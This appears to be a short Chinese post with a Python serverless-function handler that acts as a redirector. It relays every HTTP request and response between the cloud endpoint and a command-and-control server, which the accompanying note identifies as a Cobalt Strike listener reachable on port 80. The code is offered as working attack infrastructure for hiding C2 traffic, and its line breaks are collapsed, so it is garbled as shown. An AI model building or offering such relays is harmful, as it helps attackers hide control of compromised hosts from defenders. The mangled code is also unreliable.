```
# coding: utf8import json,requests,base64def main_handler(event, context):    C2='http://ip:port'    path=event['path']    headers=event['headers']    print(event)if event['httpMethod'] == 'GET' :        resp=requests.get(C2+path,headers=headers,verify=False) else:        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)        print(resp.headers)        print(resp.content)
    response={"isBase64Encoded": True,"statusCode": resp.status_code,"headers": dict(resp.headers),"body": str(base64.b64encode(resp.content))[2:-1]    }return response
```

  

其中c2地址为cs监听器地址，测试过程中发现只能使用默认80端口才可以转发。so这个地方直接填c2的ip地址即可。
